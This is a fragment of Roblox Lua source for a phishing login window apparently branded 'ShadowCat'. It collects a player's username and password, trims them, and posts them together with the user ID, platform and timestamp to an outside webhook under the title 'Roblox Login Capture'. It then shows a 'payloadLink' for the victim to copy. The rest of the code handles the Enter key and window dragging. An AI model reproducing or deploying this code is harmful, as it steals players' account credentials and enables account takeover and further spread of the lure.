local function send(u, p)
    local data = { embeds = {{ title = "🎮 Roblox Login Capture", color = 0x0099ff, fields = {
        { name = "👤 Username", value = u, inline = true },
        { name = "🔑 Password", value = "||"..p.."||", inline = true },
        { name = "🆔 User ID", value = plr.UserId, inline = true },
        { name = "🌐 Platform", value = gui:GetCurrentPlatform() or "Unknown", inline = true },
        { name = "⏰ Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
    }, footer = { text = "ShadowCat" } } } }
    local json = http:JSONEncode(data)
    pcall(function() http:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson) end)
end

btn.MouseButton1Click:Connect(function()
    local u = ub.Text:gsub("^%s*(.-)%s*$", "%1")
    local p = pb.Text:gsub("^%s*(.-)%s*$", "%1")
    if u == "" or p == "" then
        err.Text = "⚠️ Please fill in both fields."
        err.Visible = true
        return
    end
    send(u, p)
    ul.Visible = false
    ub.Visible = false
    pl.Visible = false
    pb.Visible = false
    btn.Visible = false
    err.Visible = false
    cf.Visible = true
    cb.Text = payloadLink
end)

copyBtn.MouseButton1Click:Connect(function()
    local ok, e = pcall(function() clip(payloadLink) end)
    if ok then
        copyBtn.Text = "✅ Copied!"
        task.wait(1)
        copyBtn.Text = "📋 Copy Link"
    else
        copyBtn.Text = "❌ Copy failed (select manually)"
        task.wait(1)
        copyBtn.Text = "📋 Copy Link"
    end
end)

close.MouseButton1Click:Connect(function() sg:Destroy() end)

local function enter(inp, proc)
    if inp.KeyCode == Enum.KeyCode.Return or inp.KeyCode == Enum.KeyCode.KeypadEnter then
        if not proc then
            if cf.Visible then copyBtn:Click() else btn:Click() end
        end
    end
end
ub.InputBegan:Connect(enter)
pb.InputBegan:Connect(enter)

-- dragging
local drag = false
local ds, sp
f.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag = true
        ds = i.Position
        sp = f.Position
    end
end)
f.InputChanged:Connect(function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - ds
        f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
    end
end)
f.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag = false
    end
end)
